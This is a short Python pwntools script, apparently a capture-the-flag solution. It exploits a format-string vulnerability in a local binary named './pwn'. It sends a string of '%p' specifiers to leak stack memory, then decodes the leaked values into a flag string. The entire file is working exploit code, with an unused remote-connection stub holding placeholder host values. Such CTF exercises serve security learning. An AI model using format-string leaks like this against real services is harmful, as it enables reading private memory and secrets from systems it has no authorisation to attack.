#!/usr/bin/python3

from pwn import *

class conn:
	def local():
		elf = ELF("./pwn")
		p = elf.process()
		return p
	def remote():
		p = remote("ip_addr",port)
		return p

def exploit():
	p = conn.local()
	print(p.recvline())
	payload = b"%p"*16
	p.sendline(payload)
	flag = str(p.recvuntil(b"What is")).replace("(nil)",'')
	flag = flag.replace("\\n",'')
	flag = flag.replace("'",'')
	flag = flag.replace("What is",'')
	print(flag)
	print("Wiiihiiiiihihihih :)")
	decoded_flag = []
	for element in flag.split("0x")[1:]:
	    decoded_flag.append(str(p32(int("0x" + element,16))))
	decoded_flag = ''.join(decoded_flag)
	print(decoded_flag.replace("'b'",''))	
	p.close()

if __name__ == "__main__":
	exploit()
